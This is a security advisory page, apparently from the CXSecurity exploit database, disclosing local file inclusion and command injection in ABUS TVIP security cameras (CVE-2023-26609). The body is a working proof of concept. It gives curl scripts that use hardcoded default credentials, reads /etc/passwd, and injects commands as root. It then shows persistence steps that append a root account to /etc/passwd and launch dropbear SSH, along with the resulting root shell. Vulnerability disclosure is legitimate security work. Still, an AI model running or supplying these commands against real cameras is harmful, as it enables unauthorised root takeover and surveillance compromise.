---
title: ABUS Security Camera TVIP 20000-21150 LFI / Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023020046
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-28
fetch_date: 2025-10-04T08:12:14.855969
---

# ABUS Security Camera TVIP 20000-21150 LFI / Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ABUS Security Camera TVIP 20000-21150 LFI / Remote Code Execution** **2023.02.27**  Credit:  **[d1g](https://cxsecurity.com/author/d1g/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-26609](https://cxsecurity.com/cveshow/CVE-2023-26609/ "Click to see CVE-2023-26609")**  CWE: **[CWE-98](https://cxsecurity.com/cwe/CWE-98 "Click to see CWE-98")** | |

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# Exploit Title: ABUS Security Camera LFI, RCE and SSH Root Access
# Date: 2023-02-16
# Exploit Author: d1g@segfault.net for NetworkSEC [NWSSA-001-2023]
# Vendor Homepage: https://www.abus.com
# Version/Model: TVIP 20000-21150 (probably many others)
# Tested on: GM ARM Linux 2.6, Server: Boa/0.94.14rc21
# CVE: CVE-2023-26609
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++
0x00 DESCRIPTION
++++++++++++++++++++
During a recent engagement, a network camera was discovered. Web fuzzing
revealed a URL of
/device
containing output about running processes as well as a pretty complete
listing of webcontent which inevitably arose our suspicion.
More research revealed that files w/ known LFI and RCE issues were present,
leading to either arbitrary file reads or remote code execution, both w/
root privileges and using known default credentials (either admin:admin
or manufacture:erutcafunam).
After closer filesystem inspection, RCE led to a remote root SSH shell.
+++++++++++++++
0x01 IMPACT
+++++++++++++++
The LFI vulnerability can be exploited using a URL of:
/cgi-bin/admin/fileread?READ.filePath=[filename]
and is able to read any file on the system.
The RCE vulnerability originates from a command injection and may be
exploited by calling a URL of:
/cgi-bin/mft/wireless\_mft?ap=irrelevant;[command]
(as classy as it can get, we can also use the pipe "|" instead, and
linefeed a.k.a. "%0a" works as well)
effectively giving us remote code (or rather command) execution.
+++++++++++++++++++++++++++++++
0x02 PROOF OF CONCEPT (PoC)
+++++++++++++++++++++++++++++++
#!/bin/bash
#
# ABUS Security Camera LFI
#
curl -iv "http://admin:admin@a.b.c.d/cgi-bin/admin/fileread?READ.filePath=/$1"
The script can be called like:
./LFI.sh /etc/passwd
to display the contents of the passwd file. When reading the configuration of
the BOA server (/etc/boa.conf), we find hardcoded credentials:
# MFT: Specify manufacture commands user name and password
MFT manufacture erutcafunam
These can now be used to execute the RCE (based on command injection):
#!/bin/bash
#
# ABUS Security Camera RCE
#
curl -iv "http://manufacture:erutcafunam@a.b.c.d/cgi-bin/mft/wireless\_mft?ap=testname;$1"
and can be called like:
./LFI.sh id
to display a user id of
uid=0(root) gid=0(root)
+++++++++++++++++++++++++++++++
0x03 SSH Remote Root Access
+++++++++++++++++++++++++++++++
After having discovered the previously described vulnerabilities, multiple
attempts to spawn a nice reverse shell failed as the system was minimal
and did neither offer binaries like bash or netcat, nor any compilers or
scripting language interpreters to execute our code. Furthermore, binaries
that we transferred onto the system (for ARM little-endian architecture)
either resulted in "Segmentation fault" (mfsvenom) or as we saw later
"Illegal instruction" (netcat for ARM).
We had to inspect the local attack surface and use the LOLBIN approach,
a.k.a. living off the land binaries available on the system.
In this case, the minimal and often busybox-included dropbear SSH daemon
became pretty handy.
To successfully implement a remote root SSH shell for persistance, several
steps had to be undertaken:
1) First, we had to create a valid SSH keyset by reusing our RCE.sh skript:
./RCE.sh "/etc/dropbear/dropbearkey%20-t%20rsa%20-f%20/etc/dropbear/dropbear\_rsa\_host\_key"
2) Then, add our user to the password file, e.g.:
./RCE.sh "echo%20d1g:OmE2EUpLJafIk:0:0:root:/:/bin/sh%20>>%20/etc/passwd"
3) Finally, start the server:
./RCE.sh "/etc/dropbear/dropbear%20-E%20-F"
We can now SSH (using obsolete and insecure algorithms for both KeyExchange and HostKey)
into our rootshell:
sshpass -p XXXXXXX ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa d1g@x.x.x.x
Welcome to
\_\_\_\_\_ \_\_ \_\_\_ \_\_ \_\_\_ \_ \_ \_
| \_\_\_| / \ / \_\_ \ / \ | \_ \ / \ \ \ / /
| |\_\_\_ / /\ \ | /\_\_\ \ / /\ \ | | \ | / /\ \ \ V /
| \_\_\_|| |\_\_| | | \_ / | |\_\_| | | | | | | |\_\_| | \ /
| | | \_\_ | | | \ \ | \_\_ | | |\_/ / | \_\_ | | |
|\_| |\_| |\_| |\_| \\_\|\_| |\_| |\_\_\_ / |\_| |\_| |\_|
For further information check:
http://www.GM.com/
BusyBox v1.1.3 (2012.07.16-03:58+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.
[d1g]# id
uid=0(root) gid=0(root)
---
#EOF

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020046)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top